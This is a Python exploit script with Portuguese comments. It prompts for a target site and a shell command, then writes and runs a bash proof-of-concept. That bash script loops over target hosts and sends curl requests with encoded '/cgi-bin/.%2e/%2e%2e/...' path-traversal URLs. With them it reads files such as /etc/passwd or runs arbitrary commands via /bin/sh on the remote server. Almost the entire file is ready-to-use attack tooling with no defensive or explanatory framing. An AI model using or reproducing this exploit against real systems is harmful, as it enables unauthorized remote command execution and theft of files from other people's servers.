import os
import subprocess
import sys

def print_banner():
    os.system("clear")
    try:
        subprocess.run("figlet Exploit", shell=True, check=True)
    except subprocess.CalledProcessError:
        print("#################################")
        print("#         EXPLOIT SCRIPT        #")
        print("#################################")
    print("\n")

def get_user_input(prompt_message, default_value=None):
    while True:
        user_input = input(prompt_message).strip()
        if user_input:
            return user_input
        elif default_value is not None:
            return default_value
        else:
            print("Entrada não pode ser vazia. Por favor, tente novamente.")

def create_file(file_path, content):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"[*] Arquivo '{file_path}' criado com sucesso.")
    except IOError as e:
        print(f"[ERRO] Não foi possível criar o arquivo '{file_path}': {e}")
        sys.exit(1)

if __name__ == "__main__":
    print_banner()

    home_dir = os.path.expanduser('~')
    print(f"[*] Usando o diretório home: {home_dir}")

    target_site = get_user_input("Digite o site alvo (ex: http://testphp.vulnweb.com): ")
    print(f"[*] Alvo registrado: {target_site}")

    command_to_run = get_user_input("Digite o comando para executar no acesso remoto (ex: whoami): ", default_value="whoami")
    print(f"[*] Comando registrado: {command_to_run}")

    script_dir = os.path.dirname(os.path.abspath(__file__))

    targets_file_path = os.path.join(script_dir, "targets.txt")
    create_file(targets_file_path, target_site + "\n")

    # AQUI ESTÁ A CORREÇÃO PRINCIPAL: As variáveis Bash ($var) dentro da string não precisam de {{}}
    bash_script_content = f"""#!/bin/bash

if [[ -z "$1" || -z "$2" ]]; then
    echo "Uso: $0 [TARGET-LIST.TXT] [CAMINHO_OU_SHELL] [COMANDO_OPCIONAL]"
    echo "Exemplo para ler arquivo: $0 targets.txt /etc/passwd"
    echo "Exemplo para executar comando: $0 targets.txt /bin/sh whoami"
    exit 1
fi  

targets_file="$1"
path_arg="$2"
command_arg="$3"

if [ ! -f "$targets_file" ]; then
    echo "[ERRO] Arquivo de alvos '$targets_file' não encontrado."
    exit 1
fi

for host in $(cat "$targets_file"); do # << AQUI ESTÁ A VARIÁVEL "$targets_file" SEM {{}}
    echo "--- Testando: $host ---" # << AQUI ESTÁ A VARIÁVEL "$host" SEM {{}}
    if [[ -n "$command_arg" ]]; then # << AQUI ESTÁ A VARIÁVEL "$command_arg" SEM {{}}
        echo "[*] Tentando executar comando: '$command_arg' via '$path_arg'" # << AQUI SEM {{}}
        curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $command_arg" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$path_arg" # << AQUI SEM {{}}
    else
        echo "[*] Tentando ler arquivo: '$path_arg'" # << AQUI SEM {{}}
        curl -s --path-as-is "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$path_arg" # << AQUI SEM {{}}
    fi
    echo ""
done
"""
    poc_script_path = os.path.join(script_dir, "PoC.sh")
    create_file(poc_script_path, bash_script_content)

    try:
        os.chmod(poc_script_path, 0o755)
        print(f"[*] Permissão de execução concedida a '{poc_script_path}'.")
    except OSError as e:
        print(f"[ERRO] Não foi possível conceder permissão de execução a '{poc_script_path}': {e}")
        sys.exit(1)

    print("\n--- Executando o Exploit Bash ---")
    try:
        second_arg_poc = "/bin/sh" if command_to_run else "" 
        
        bash_command_args = [
            poc_script_path,
            targets_file_path, # Passando o caminho real do arquivo targets.txt
            second_arg_poc
        ]
        if command_to_run:
            bash_command_args.append(command_to_run)

        result = subprocess.run(bash_command_args, capture_output=True, text=True, check=False)

        print("\n--- Saída do Exploit ---")
        print(result.stdout)
        if result.stderr:
            print("\n--- Erros do Exploit (stderr) ---")
            print(result.stderr)

        if result.returncode != 0:
            print(f"\n[AVISO] O script Bash terminou com código de saída {result.returncode}. Pode ter havido um erro.")
        else:
            print("\n[*] Script Bash executado com sucesso (verifique a saída acima).")

    except FileNotFoundError:
        print(f"[ERRO] O script Bash '{poc_script_path}' não foi encontrado. Verifique o caminho.")
    except Exception as e:
        print(f"[ERRO] Ocorreu um erro ao executar o script Bash: {e}")

    print("\n--- Fim da Execução ---")
